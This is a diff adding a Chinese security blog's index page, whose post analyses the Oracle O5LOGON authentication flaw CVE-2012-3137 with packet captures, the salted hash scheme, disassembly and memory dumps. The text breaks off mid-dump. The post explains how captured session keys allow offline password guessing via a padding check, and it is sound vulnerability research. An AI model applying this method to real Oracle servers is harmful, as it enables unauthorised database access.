@@ -1,0 +1,1350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"usmacd.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="安全代码">
+<meta property="og:url" content="http://usmacd.com/page/2/index.html">
+<meta property="og:site_name" content="安全代码">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="henices">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://usmacd.com/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>安全代码</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">安全代码</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/cve-2012-3137/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/19/cve-2012-3137/" class="post-title-link" itemprop="url">Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">NSFOCUS ID:    20847</span><br><span class="line">BUGTRAQ ID:    55651</span><br><span class="line">CVE ID:        CVE-2012-3137</span><br><span class="line">远程漏洞：      是</span><br><span class="line">本地漏洞：      是</span><br><span class="line">漏洞类型：</span><br><span class="line">漏洞影响：      远程攻击者可以密码进行离线密码暴力破解</span><br><span class="line">危险指数：      高</span><br><span class="line">创建时间：      2012-9-27</span><br><span class="line">更新时间：</span><br><span class="line">攻击代码：      无</span><br><span class="line"></span><br><span class="line">跟踪工程师：    zz</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述:"></a>漏洞概述:</h2><p>Oracle是一款广泛被使用的商业数据库。</p>
+<p>Oracle O5LOGON认证协议存在漏洞，这个漏洞可以使攻击者离线暴力破解Oracle数据库密码，<br>从而访问受保护的Oracle数据库中的数据。要利用这个漏洞攻击者只需要知道一个合法的<br>数据库用户名和一个正确的数据库名(SID)，不需要使用中间人攻击。</p>
+<p>Martinez Fayo 在2010年5月向Oracle报告了这个问题，Oracle在2011年的中期通过patch<br> set 11.2.0.3修复了这个漏洞，使用了新版本的协议。但是Oracle没有在 11.1和11.2 中<br>修复这个问题，因此这些版本仍然存在漏洞。</p>
+<p>由于漏洞发生在认证阶段的早期，获取需要的数据后马上断开连接，不会在Oracle数据库<br>里留下登录日志，因此这个漏洞被称为 “stealth password cracking vulnerability”</p>
+<p>细节：</p>
+<p>O5LOGON 过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         send username</span><br><span class="line">Client -----------------------------&gt; Server</span><br><span class="line"></span><br><span class="line">         AUTH_SESSKEY  AUTH_VFR_DATA</span><br><span class="line">Client &lt;----------------------------  Server</span><br><span class="line"></span><br><span class="line">         AUTH_SESSKEY  AUTH_PASSWORD</span><br><span class="line">Clinet -----------------------------&gt; Server</span><br></pre></td></tr></table></figure>
+
+<p>和这个漏洞相关的两个报文，包含了需要的信息, 如下：</p>
+<p>(1) Server -&gt; client</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0000   00 f8 00 00 06 00 00 00 00 00 08 02 00 0c 00 00  ................</span><br><span class="line">0010   00 0c 41 55 54 48 5f 53 45 53 53 4b 45 59 60 00  ..AUTH_SESSKEY&#96;.</span><br><span class="line">0020   00 00 60 35 32 46 43 30 34 42 31 46 46 38 31 31  ..&#96;52FC04B1FF811</span><br><span class="line">0030   30 43 41 31 32 36 33 44 46 35 42 43 36 31 41 37  0CA1263DF5BC61A7</span><br><span class="line">0040   45 35 37 37 34 30 43 38 41 35 31 31 31 44 32 32  E57740C8A5111D22</span><br><span class="line">0050   42 34 31 45 35 33 43 43 31 36 37 46 44 46 32 41  B41E53CC167FDF2A</span><br><span class="line">0060   36 38 37 38 39 35 38 32 30 30 44 39 42 32 42 36  6878958200D9B2B6</span><br><span class="line">0070   41 35 31 43 39 35 44 37 37 39 46 44 45 42 41 42  A51C95D779FDEBAB</span><br><span class="line">0080   42 36 39 00 00 00 00 0d 00 00 00 0d 41 55 54 48  B69.........AUTH</span><br><span class="line">0090   5f 56 46 52 5f 44 41 54 41 14 00 00 00 14 34 33  _VFR_DATA.....43</span><br><span class="line">00a0   45 30 42 45 32 30 42 33 32 42 30 42 42 37 36 45  E0BE20B32B0BB76E</span><br><span class="line">00b0   35 37 25 1b 00 00 04 01 00 00 00 02 00 00 00 00  57%.............</span><br><span class="line">00c0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00d0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00e0   00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00f0   00 00 00 00 00 00 00 00                          ........</span><br></pre></td></tr></table></figure>
+
+
+<p>(2) server &lt;- client</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0000   03 73 03 d0 1a 05 0a 09 00 00 00 21 01 00 00 44  .s.........!...D</span><br><span class="line">0010   46 bf bf 0d 00 00 00 ec 42 bf bf d8 53 bf bf 03  F.......B...S...</span><br><span class="line">0020   73 79 73 24 00 00 00 0c 41 55 54 48 5f 53 45 53  sys$....AUTH_SES</span><br><span class="line">0030   53 4b 45 59 20 01 00 00 fe 40 46 41 36 44 43 44  SKEY ....@FA6DCD</span><br><span class="line">0040   30 46 33 38 39 45 39 32 44 31 38 46 38 31 38 38  0F389E92D18F8188</span><br><span class="line">0050   45 43 36 39 33 31 33 42 35 32 34 46 34 32 31 31  EC69313B524F4211</span><br><span class="line">0060   38 34 46 41 45 36 37 39 36 31 33 41 37 32 46 43  84FAE679613A72FC</span><br><span class="line">0070   38 44 46 44 30 41 34 43 37 42 20 42 39 33 41 36  8DFD0A4C7B B93A6</span><br><span class="line">0080   41 43 42 38 45 30 35 42 38 32 35 38 41 30 32 30  ACB8E05B8258A020</span><br><span class="line">0090   44 32 39 35 34 45 43 31 42 36 33 00 01 00 00 00  D2954EC1B63.....</span><br><span class="line">00a0   27 00 00 00 0d 41 55 54 48 5f 50 41 53 53 57 4f  &#39;....AUTH_PASSWO</span><br><span class="line">00b0   52 44 c0 00 00 00 40 32 43 35 46 39 35 37 41 36  RD....@2C5F957A6</span><br><span class="line">00c0   35 33 32 41 44 39 31 44 39 31 36 46 34 45 35 46  532AD91D916F4E5F</span><br><span class="line">00d0   41 37 44 32 46 44 41 30 45 36 43 44 46 46 42 41  A7D2FDA0E6CDFFBA</span><br><span class="line">00e0   41 45 44 38 38 33 43 41 46 34 46 32 30 30 43 38  AED883CAF4F200C8</span><br><span class="line">00f0   39 38 33 41 45 33 44 00 00 00 00 18 00 00 00 08  983AE3D.........</span><br><span class="line">0100   41 55 54 48 5f 52 54 54 0f 00 00 00 05 36 36 37  AUTH_RTT.....667</span><br><span class="line">0110   30 38 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f  08....&#39;....AUTH_</span><br><span class="line">0120   43 4c 4e 54 5f 4d 45 4d 0c 00 00 00 04 34 30 39  CLNT_MEM.....409</span><br><span class="line">0130   36 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f 54  6....&#39;....AUTH_T</span><br><span class="line">0140   45 52 4d 49 4e 41 4c 12 00 00 00 06 70 74 73 2f  ERMINAL.....pts&#x2F;</span><br><span class="line">0150   31 38 00 00 00 00 2d 00 00 00 0f 41 55 54 48 5f  18....-....AUTH_</span><br><span class="line">0160   50 52 4f 47 52 41 4d 5f 4e 4d 51 00 00 00 1b 73  PROGRAM_NMQ....s</span><br><span class="line">0170   71 6c 70 6c 75 73 40 68 65 6e 69 63 65 73 20 28  qlplus@henices (</span><br><span class="line">0180   54 4e 53 20 56 31 2d 56 33 29 00 00 00 00 24 00  TNS V1-V3)....$.</span><br><span class="line">0190   00 00 0c 41 55 54 48 5f 4d 41 43 48 49 4e 45 15  ...AUTH_MACHINE.</span><br><span class="line">01a0   00 00 00 07 68 65 6e 69 63 65 73 00 00 00 00 18  ....henices.....</span><br><span class="line">01b0   00 00 00 08 41 55 54 48 5f 50 49 44 0c 00 00 00  ....AUTH_PID....</span><br><span class="line">01c0   04 36 32 32 38 00 00 00 00 18 00 00 00 08 41 55  .6228.........AU</span><br><span class="line">01d0   54 48 5f 53 49 44 15 00 00 00 07 68 65 6e 69 63  TH_SID.....henic</span><br><span class="line">01e0   65 73 00 00 00 00 18 00 00 00 08 41 55 54 48 5f  es.........AUTH_</span><br><span class="line">01f0   41 43 4c 0c 00 00 00 04 34 34 30 30 00 00 00 00  ACL.....4400....</span><br><span class="line">0200   36 00 00 00 12 41 55 54 48 5f 41 4c 54 45 52 5f  6....AUTH_ALTER_</span><br><span class="line">0210   53 45 53 53 49 4f 4e 6f 00 00 00 25 41 4c 54 45  SESSIONo...%ALTE</span><br><span class="line">0220   52 20 53 45 53 53 49 4f 4e 20 53 45 54 20 54 49  R SESSION SET TI</span><br><span class="line">0230   4d 45 5f 5a 4f 4e 45 3d 27 2b 30 38 3a 30 30 27  ME_ZONE&#x3D;&#39;+08:00&#39;</span><br><span class="line">0240   00 01 00 00 00 45 00 00 00 17 41 55 54 48 5f 4c  .....E....AUTH_L</span><br><span class="line">0250   4f 47 49 43 41 4c 5f 53 45 53 53 49 4f 4e 5f 49  OGICAL_SESSION_I</span><br><span class="line">0260   44 60 00 00 00 20 43 41 41 38 39 33 41 43 30 41  D&#96;... CAA893AC0A</span><br><span class="line">0270   34 33 30 46 41 30 45 30 34 30 30 30 37 46 30 31  430FA0E040007F01</span><br><span class="line">0280   30 31 31 38 35 34 00 00 00 00 30 00 00 00 10 41  011854....0....A</span><br><span class="line">0290   55 54 48 5f 46 41 49 4c 4f 56 45 52 5f 49 44 00  UTH_FAILOVER_ID.</span><br><span class="line">02a0   00 00 00 00 00 00 00                             .......</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AUTH_SESSKEY_SRV: 52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="line">AUTH_SESSKEY_CLI: FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="line">AUTH_PASSWORD   : 2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="line">AUTH_VFR_DATA   : 43E0BE20B32B0BB76E57</span><br></pre></td></tr></table></figure>
+
+<h2 id="Oracle-O5LOGON-协议介绍"><a href="#Oracle-O5LOGON-协议介绍" class="headerlink" title="Oracle O5LOGON 协议介绍"></a>Oracle O5LOGON 协议介绍</h2><p>Oracle 11g password hash 算法为, 用户名 sys, 密码 nsfocus</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha1(<span class="string">'nsfocus'</span> + <span class="string">'\x43\xE0\xBE\x20\xB3\x2B\x0B\xB7\x6E\x57'</span>).hexdigest()</span><br><span class="line"><span class="string">'c3d98762d258d4bd92c572065ddea9af38123f88'</span></span><br></pre></td></tr></table></figure>
+
+<p>可以在Oracle数据中查询:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select name, password, spare4 from sys.user$ where name = 'SYS';</span><br><span class="line"></span><br><span class="line">NAME                   PASSWORD</span><br><span class="line"><span class="comment">------------------------------ ------------------------------</span></span><br><span class="line">SPARE4</span><br><span class="line"><span class="comment">--------------------------------------------------------------------------------</span></span><br><span class="line">SYS                0F2417000362F55F</span><br><span class="line">S:C3D98762D258D4BD92C572065DDEA9AF38123F8843E0BE20B32B0BB76E57</span><br><span class="line"></span><br><span class="line">password hash： C3D98762D258D4BD92C572065DDEA9AF38123F88</span><br><span class="line">salt         ： 43E0BE20B32B0BB76E57</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>client 发送用户名给server<br>2  server 判断是否是可用的用户名，如果用户名可用，进入下一步。</li>
+<li>Server 加密AUTH_SESSKEY,  取出 salt</li>
+</ol>
+<p>使用AES192 CBC 加密AUTH_SESSKEY, key为oralce数据库中的20字节的password hash和4个<br>零(192bit)。</p>
+<ol start="4">
+<li><p>Server 将加密的AUTH_SESSKEY和AUTH_VFR_DATA 发送给Client<br>AUTH_VFR_DATA 为salt</p>
+</li>
+<li><p>Client计算password hash (通过用户输入的密码), 使用Client计算的password hash<br>(加上4个零)为key 使用AES192 CBC算法加密Client AUTH_SESSKEY</p>
+</li>
+<li><p>Client 计算 Combine_SessKey<br>将解密的Server AUTH_SESSKEY 和 Client AUTH_SESSKEY的第17个字节开始的24个字节做异<br>或，将异或结果的前16字节做MD5, 后8字节做MD5, 得到Combine_SessKey</p>
+</li>
+<li><p>Client 使用 Combine_SessKey 加密用户输入的密码明文，得到 AUTH_PASSWORD<br>使用算法为AES192 CBC</p>
+</li>
+<li><p>Client 将加密的Client AUTH_SESSKEY和加密的AUTH_PASSWORD 发送给 Server</p>
+</li>
+<li><p>Server 使用数据库中的 password hash 解密 Client AUTH_SESSKEY</p>
+</li>
+<li><p>Server 尝试解密AUTH_PASSWORD 解密成功则认证通过</p>
+</li>
+</ol>
+<p>参看:<br><a href="http://www.oxid.it/downloads/oracle_tns_aes192_check.txt" target="_blank" rel="noopener">http://www.oxid.it/downloads/oracle_tns_aes192_check.txt</a></p>
+<p>这个漏洞是生成server sesskey 时，在末尾添加了8个0x08, 因为salt已知（由服务器返回<br>），因此我们只需尝试计算SHA-1的password hash，然后利用这个password hash 去解密<br>server sesskey， 只要末尾是8个0x08 则说明这是正确的server sesskey，此时使用的密<br>码为正确的密码，原因是</p>
+<p>AES 192 加密块长度为128 bit (16 byte), 分组加密如果明文内容不是块长度的整数倍时<br>需要填充。填充部分的内容为差的字节数，比如11字节的明文，需要在末尾填充5个0x5</p>
+<p>从汇编代码里分析server session key 的生成过程，分析的程序为 Oracle.exe 11.2.0.1.0<br>oracle.exe调用 oran11.ztvo5ke 加密session key</p>
+<p>oran11.ztvo5ke -&gt; oracrypt11.ztceenc  -&gt; orancrypt11.ztcen</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e_key</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">100</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sess_key</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> type;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">40</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pwd_hash</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> unknown1;</span><br><span class="line">    <span class="keyword">uint32_t</span> hash_len;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> hash[<span class="number">20</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ztvo5ke ( e_key*, sess_key*, pwd_hash*, <span class="keyword">int</span>);</span><br></pre></td></tr></table></figure>
+<p>sess_key.type == 0x1492 ( AES 192 )</p>
+<p>plaintext    24  + 16 = 40 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:101BC481                 push    eax        ; unknown structure</span><br><span class="line">.text:101BC482                 push    edx        ; encrypted session key</span><br><span class="line">.text:101BC483                 push    28h        ; length</span><br><span class="line">.text:101BC485                 push    ecx        ; plaintext session key</span><br><span class="line">.text:101BC486                 push    0</span><br><span class="line">.text:101BC488                 push    ebx        ; 0x18</span><br><span class="line">.text:101BC489                 push    87004001h</span><br><span class="line">.text:101BC48E                 call    ztceenc    ; AES 192</span><br><span class="line">.text:101BC493                 add     esp, 1Ch</span><br><span class="line">.text:101BC496                 mov     ebx, eax</span><br><span class="line">.text:101BC498                 test    ebx, ebx</span><br><span class="line">.text:101BC49A                 jnz     short loc_101BC4B8</span><br><span class="line">.text:101BC49C                 lea     edx, [ebp+var_A4]</span><br><span class="line">.text:101BC4A2                 lea     eax, [edi+2]</span><br><span class="line">.text:101BC4A5                 push    eax       ; e_key+2</span><br><span class="line">.text:101BC4A6                 push    [ebp+var_C8]</span><br><span class="line">.text:101BC4AC                 push    edx       ; encryted session key</span><br><span class="line">.text:101BC4AD                 call    ztucbtx</span><br></pre></td></tr></table></figure>
+
+<p>ztceenc  运行前后的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0DC3A4E4                                      40 00 00 00                       </span><br><span class="line">0DC3A4F4  00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00..                        </span><br><span class="line">0DC3A504  0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00..                        </span><br><span class="line">0DC3A514  02 00 00 00 00 00 00 00 14 00 00 00 14 00 00 00..                     </span><br><span class="line">0DC3A524  44 94 3E 10 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A534  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A544  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A554  7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9..                        </span><br><span class="line">0DC3A564  EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37..                        </span><br><span class="line">0DC3A574  8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D..                        </span><br><span class="line">0DC3A584  C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B..                        </span><br><span class="line">0DC3A594  0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A5A4  18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C..                     </span><br><span class="line">0DC3A5B4  94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D..                        </span><br><span class="line">0DC3A5C4  F8 49 FE 0C 10 FB EC 0D..........................                     </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line">eax &#x3D; 0DC3A4F0                                                                  </span><br><span class="line">edx &#x3D; 0DC3A514                                                                  </span><br><span class="line">ecx &#x3D; 0DC3A554                                                                  </span><br><span class="line">ebx &#x3D; 0DC3A5A4                                                                  </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line">0DC3A4E4                                      30 00 00 00..                     </span><br><span class="line">0DC3A4F4  00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00..                        </span><br><span class="line">0DC3A504  0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00..                        </span><br><span class="line">0DC3A514  61 15 91 7F D6 AE B9 29 00 07 A4 02 A6 B1 2B AA..                        </span><br><span class="line">0DC3A524  BD 3B AA 0C 13 C0 E5 18 8E FE BA AC F5 4C 01 BE.                      </span><br><span class="line">0DC3A534  96 8F 59 0D B9 9E 2C F6 98 74 1F EF 22 CE 17 47..                        </span><br><span class="line">0DC3A544  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A554  7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9..                        </span><br><span class="line">0DC3A564  EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37..                        </span><br><span class="line">0DC3A574  8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D..                        </span><br><span class="line">0DC3A584  C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B..                        </span><br><span class="line">0DC3A594  0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A5A4  18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C..                     </span><br><span class="line">0DC3A5B4  94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D..                        </span><br><span class="line">0DC3A5C4  F8 49 FE 0C 10 FB EC 0D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0DC3A4F0   30 00 00 00       offset</span><br><span class="line">0DC3A514   61 15 91 7F  ...  encrypted session key (0x30 byte)</span><br><span class="line">0DC3A554   7A EF 5B 9E  ...  plaintext session key (0x28 byte)</span><br><span class="line">0DC3A584   8 B3 13 21   ...  password  hash        (0x18 